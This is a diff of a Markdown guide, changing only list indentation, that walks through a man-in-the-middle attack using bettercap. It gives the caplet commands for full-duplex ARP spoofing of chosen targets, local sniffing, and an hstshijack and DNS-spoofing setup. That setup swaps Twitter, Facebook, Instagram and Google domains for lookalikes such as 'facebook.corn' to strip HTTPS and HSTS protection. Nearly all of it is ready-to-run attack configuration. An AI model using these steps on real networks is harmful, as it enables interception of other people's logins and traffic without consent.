@@ -12,27 +12,27 @@
    4. Pick a client and exit bettercap.
    5. __Note: Can also use netdiscover or nmap for host scanning.__
 2. Create/Edit your spoof caplet (spoof.caplet)
-  1. `set arp.spoof.fullplex true`  : Capture both incoming/outgoing traffic. 
-  2. `set arp.spoof.targets <target ip/mac>` : Comma-separated list of IPs/MACs to spoof.
-  3. `set net.sniff.local true` :  Sniff local (attackbox) traffic as well - needed for bypassing HTTPS.
+   1. `set arp.spoof.fullplex true`  : Capture both incoming/outgoing traffic. 
+   2. `set arp.spoof.targets <target ip/mac>` : Comma-separated list of IPs/MACs to spoof.
+   3. `set net.sniff.local true` :  Sniff local (attackbox) traffic as well - needed for bypassing HTTPS.
 3. Edit hstshijack config file to bypass specific sites configured with HSTS.
-  1. `nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap `
-  2. Targets and replacements could look like this… (customize to your liking)
+   1. `nano /usr/local/share/bettercap/caplets/hstshijack/hstshijack.cap `
+   2. Targets and replacements could look like this… (customize to your liking)
     `
     set hstshijack.targets         twitter.com,*.twitter.com,facebook.com,*.facebook.com,instagram.com,*.instagram.com,google.com,*.google.com, gstatic.com, *.gstatic.com
     set hstshijack.replacements    twiter.com,*.twiter.com,facebook.corn,*.facebook.corn,instagam.com,*.instagam.com,google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
     `
-  3. dns.spoof.domains could look like this... (customize to your liking)
+   3. dns.spoof.domains could look like this... (customize to your liking)
     `
     dns.spoof.domains
     set dns.spoof.domains  twiter.com,*.twiter.com,facebook.corn,*.facebook.corn,instagam.com,*.instagam.com,google.corn,*.google.corn,gstatic.corn,*.gstatic.corn
     `
 4. Start bettercap with customized caplet.
-  1. `bettercap -iface <interface> -caplet <capletfile>`
-  2. Example: `bettercap -iface eth0 -caplet spoof.caplet`
+   1. `bettercap -iface <interface> -caplet <capletfile>`
+   2. Example: `bettercap -iface eth0 -caplet spoof.caplet`
 5. Enable/Verify hstshijack caplet is enabled.
-  1. `hstshijack/hstshijack`
-  2. `caplets.show`
+   1. `hstshijack/hstshijack`
+   2. `caplets.show`
 
 
 
